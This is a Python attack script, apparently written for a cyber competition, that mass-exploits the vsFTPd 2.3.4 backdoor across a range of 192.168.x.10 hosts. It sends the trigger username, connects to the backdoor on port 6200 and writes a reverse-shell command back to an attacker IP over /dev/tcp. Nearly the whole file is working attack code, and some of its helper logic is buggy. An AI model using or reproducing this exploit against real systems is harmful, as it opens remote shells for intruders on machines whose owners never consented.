#created by S1n1st3r
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket
import requests
import os
from time import sleep
import threading
import sys
import base64
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

TEAM_SUB_IP = 25

#==========Modify this for your needs=================#
def exploit(ip):
    #send exploit to connection
    try:                                
        host = ip                       
        portFTP = 21 #if necessary edit this line

        user="USER nergal:)"
        password="PASS pass"

        tn=Telnet(host, portFTP)
        tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
        tn.write(user.encode('ascii') + b"\n")
        tn.read_until(b"password.") #if necessary, edit this line
        tn.write(password.encode('ascii') + b"\n")

        tn2=Telnet(host, 6200)
        print('Success, shell opened')
        print('Send `exit` to quit shell')
        #send reverse shell through tn2
        tn2.write(b"/bin/bash -c 'sh -i >& /dev/tcp/192.168.25.102/51434 0>&1'\n")
        print("exploited")
    except Exception as e:
        print(f"Exploit to failed")
        return None


def get_ips(): 
    x = ["192.168.{}.10".format(a) for a in range(
        0, 40) if a != TEAM_SUB_IP]
    #ping ips to get valid ones
    for ip in x:
        if ping_ip(ip):
            yield ip

#just in case
def get_hostnames():
    x = ["NCX_CCE_{}_{}".format(a, b) for a in range(
        0, 120) if a != TEAM_SUB_IP for b in ["dns", "web", "db", "app"]]
    for hostname in x:
        if ping_ip(hostname):
            yield hostname

def ping_ip(ip):
    #ping IP
    DEVNULL = open(os.devnull, 'w')
    try:
        response = os.popen(f"ping -c 2 {ip}").read()
        if "Received = 4" in response:
            return False
        else:
            return True
    except Exception:
            return False

def connect(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #establish connection to ip and port, return the connection
    try:
        s.connect((ip, port))
        print(f"Connection to {ip} successful")
        exploit(s)
        print(f"Exploitation to {ip} (likely) successful")
    except Exception as e:
        print(f"Connection to {ip} failed")
        return None


def main():
    #check for port argument
    if len(sys.argv) != 2:
        print("Usage: python3 Pwn4AllFTP.py <port>")
        sys.exit(1)
    #get port from system arguments
    port = int(sys.argv[1])
    #create emtpy files of the lists
    executor = ThreadPoolExecutor(max_workers=16)
    futures = [executor.submit(exploit, ip) for ip in get_ips()]


if __name__ == "__main__":
    main()
